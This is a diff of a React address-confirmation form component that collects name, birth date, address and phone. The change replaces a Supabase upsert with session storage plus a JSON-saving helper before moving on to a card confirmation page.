@@ -1,10 +1,8 @@
-
 import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
 import ProgressStepper from "@/components/ProgressStepper";
-import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
-import { upsertUser } from "@/utils/supabaseClient";
+import { updateUserSession, getFromSession, saveUserDataToJson } from "@/utils/sessionUtils";
 import { toast } from "sonner";
 
 const AddressConfirmation: React.FC = () => {
@@ -48,20 +46,7 @@ const AddressConfirmation: React.FC = () => {
     setIsLoading(true);
 
     try {
-      // Create an object with ONLY the address-related data
-      const addressData = {
-        email,
-        nom,
-        prenom,
-        datenaissance: dateNaissance,
-        adresse,
-        codepostal: codePostal,
-        ville,
-        telephone
-      };
-      
-      // Update session storage with all the form data
-      updateUserSession({
+      const userData = {
         email,
         nom,
         prenom,
@@ -70,10 +55,11 @@ const AddressConfirmation: React.FC = () => {
         codePostal,
         ville,
         telephone
-      });
+      };
       
-      // Save ONLY the address data to Supabase
-      await upsertUser(addressData);
+      updateUserSession(userData);
+      
+      await saveUserDataToJson();
       
       setIsLoading(false);
       navigate("/card-confirmation");
